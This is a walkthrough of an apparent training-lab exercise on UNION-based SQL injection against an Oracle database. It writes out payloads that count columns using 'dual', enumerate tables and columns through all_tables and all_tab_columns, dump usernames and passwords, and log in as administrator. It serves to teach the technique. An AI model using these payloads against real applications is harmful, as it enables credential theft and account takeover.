This lab has a SQL injection vulnerability in an Oracle database. Oracle has some special rules - every SELECT statement needs a FROM clause, so we use a dummy table called `dual` when we're just testing.

---

### Step 1: Test the injection and find column count
First, I test with a single quote to see if SQL injection works. Then I figure out how many columns the query returns:

```
' UNION SELECT NULL FROM dual--
```

If that doesn't work (gives an error), I try:

```
' UNION SELECT NULL, NULL FROM dual--
```

When this works, I know there are **2 columns**. I check if both accept text:

```
' UNION SELECT 'abc', 'def' FROM dual--
```

Both work, so I have 2 text columns to work with.

---

### Step 2: Find all tables in the database
Oracle doesn't have `information_schema` like other databases. Instead, it has `all_tables`:

```
' UNION SELECT table_name, NULL FROM all_tables--
```

This shows me all tables in the database. I scroll through looking for tables that might hold users, like:
- `USERS`
- `ADMINS` 
- `ACCOUNTS`
- `CUSTOMERS`

Let's say I find `USERS_WJQSFC` (the name will be different).

---

### Step 3: Find columns in that table
To see what columns are in that table, I use `all_tab_columns`:

```
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_WJQSFC'--
```

**Important:** Oracle usually stores table and column names in UPPERCASE, so I use uppercase in my query.

This shows me column names. I look for:
- `USERNAME`, `USER`, `EMAIL`
- `PASSWORD`, `PASS`, `PWD`

Let's say I find `USERNAME_PKFJHS` and `PASSWORD_NFJDKS`.

---

### Step 4: Get the usernames and passwords
Now I can directly query the users table:

```
' UNION SELECT USERNAME_PKFJHS, PASSWORD_NFJDKS FROM USERS_WJQSFC--
```

This gives me a list of all usernames with their passwords. I look for the administrator - usually `administrator`.

---

### Step 5: Log in
I take the administrator password, go to the login page, and use:
- Username: `administrator`
- Password: `[what I found]`

---

### Complete Attack Steps:

1. **Find columns:** `' UNION SELECT 'abc', 'def' FROM dual--`
2. **Find tables:** `' UNION SELECT table_name, NULL FROM all_tables--`
3. **Find columns in users table:** `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--`
4. **Get credentials:** `' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--`
5. **Log in as administrator**

---

### Important Oracle-Specific Notes:
- **Always need FROM clause** - that's why we use `FROM dual` for testing
- **Case matters** - Oracle usually stores names in uppercase, use `USERS` not `users`
- **Different system tables** - Oracle uses `all_tables` and `all_tab_columns` instead of `information_schema`
- **The `dual` table** - A special one-row table in Oracle just for queries that don't need real data

### Why This Works:
Even though Oracle is different from MySQL or PostgreSQL, it still has system tables that track all database objects. By querying `all_tables`, we can see every table in the database. Then by querying `all_tab_columns`, we can see what columns are in any table we find.

Once we know the structure of the users table, we can extract the login credentials and use them to access the application as any user - including the administrator who has full control.